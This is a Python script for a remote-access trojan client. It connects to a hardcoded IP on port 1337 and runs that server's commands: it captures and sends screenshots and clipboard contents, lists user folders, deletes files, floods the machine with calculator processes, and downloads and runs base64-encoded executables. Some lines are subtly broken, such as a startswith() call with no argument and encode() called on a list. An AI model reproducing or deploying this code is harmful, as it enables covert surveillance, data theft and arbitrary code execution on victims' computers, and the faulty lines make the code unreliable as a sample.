import base64
import struct
import socket
import tempfile
import subprocess
import pyautogui
import io
import clipboard
import os


# TODO: conn keepalive
# sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))

server_addr = ('198.21.170.7', 1337) # REPLACE_IP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
procs = []


def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('!I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    # Read message length and unpack it into an integer
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('!I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data


try:
    sock.connect(server_addr)
    duck = sock.recv(14434).decode()
    print(duck)
except:
    exit(0)

while True:
    msg = recv_msg(sock).decode()

    if msg == 'quit':
        sock.close()
        exit(0)
    elif msg == 'kill':
        [proc.terminate() for proc in procs]
    elif msg == "calc":
        for i in range(0, 50):
            procs.append(subprocess.Popen("C:\Windows\System32\calc.exe"))
    elif msg == "screenshot":
        image = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        image.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        send_msg(sock, base64.b64encode(img_byte_arr))
    elif msg == "clipboard":
        text = clipboard.paste()
        send_msg(sock, text.encode())
    elif msg == "users":
        users = next(os.walk("C:\Users"), (None, None, []))[2]
        send_msg(sock, users.encode())
    elif msg.startswith() == 'delete':
        file_name = msg[msg.index(' '):]
        os.remove(file_name)
    elif msg.startswith("exec:"):
        payload = msg[msg.index(':'):]
        payload_bytes = base64.b64decode(payload)

        f = tempfile.TemporaryFile(suffix=".exe", delete=False)
        f_name = f.name
        f.write(payload_bytes)
        f.close()

        procs.append(subprocess.Popen(f_name))

    else:
        print(msg)
